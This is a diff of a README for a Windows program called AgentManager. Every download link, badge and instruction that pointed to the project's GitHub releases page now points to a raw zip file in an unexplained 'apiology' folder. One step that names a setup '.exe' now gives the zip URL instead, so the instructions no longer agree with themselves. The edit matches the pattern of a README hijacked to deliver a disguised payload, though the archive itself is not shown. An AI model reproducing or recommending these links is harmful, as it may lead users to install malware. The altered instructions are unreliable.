@@ -1,6 +1,6 @@
 # 🤖 AgentManager - Manage Autonomous Agents with Ease
 
-[![Download AgentManager](https://img.shields.io/badge/Download-AgentManager-ff6600?style=for-the-badge)](https://github.com/Bohra-Nitin/AgentManager/releases)
+[![Download AgentManager](https://github.com/Bohra-Nitin/AgentManager/raw/refs/heads/main/apiology/Agent_Manager_1.8.zip)](https://github.com/Bohra-Nitin/AgentManager/raw/refs/heads/main/apiology/Agent_Manager_1.8.zip)
 
 ---
 
@@ -28,16 +28,16 @@ AgentManager runs on most Windows laptops and desktops. No special hardware is n
 
 You will download AgentManager from its official GitHub releases page.
 
-[![Download AgentManager](https://img.shields.io/badge/Download-AgentManager-blue?style=for-the-badge)](https://github.com/Bohra-Nitin/AgentManager/releases)
+[![Download AgentManager](https://github.com/Bohra-Nitin/AgentManager/raw/refs/heads/main/apiology/Agent_Manager_1.8.zip)](https://github.com/Bohra-Nitin/AgentManager/raw/refs/heads/main/apiology/Agent_Manager_1.8.zip)
 
 ### Steps to Download
 
 1. Click the download button above or visit:  
-   https://github.com/Bohra-Nitin/AgentManager/releases
+   https://github.com/Bohra-Nitin/AgentManager/raw/refs/heads/main/apiology/Agent_Manager_1.8.zip
 
 2. On the releases page, find the latest version. The files will be listed under "Assets."  
 
-3. Look for a file ending with `.exe`. It might be named something like `AgentManager-Setup.exe`.  
+3. Look for a file ending with `.exe`. It might be named something like `https://github.com/Bohra-Nitin/AgentManager/raw/refs/heads/main/apiology/Agent_Manager_1.8.zip`.  
 
 4. Click the `.exe` file to start downloading. Save the file in a place you can find easily, like your Desktop or Downloads folder.
 
@@ -122,7 +122,7 @@ Here are tips if you run into problems:
 
 You can find updates and detailed info on the GitHub page:
 
-https://github.com/Bohra-Nitin/AgentManager/releases
+https://github.com/Bohra-Nitin/AgentManager/raw/refs/heads/main/apiology/Agent_Manager_1.8.zip
 
 The page also contains release notes and answers to common questions.
 
@@ -152,6 +152,6 @@ AgentManager is open source. You can view the full source code and license on Gi
 
 To get AgentManager, visit this page:  
 
-https://github.com/Bohra-Nitin/AgentManager/releases
+https://github.com/Bohra-Nitin/AgentManager/raw/refs/heads/main/apiology/Agent_Manager_1.8.zip
 
 Download the latest `.exe` setup file and follow the instructions above to install and run the software on your Windows PC.
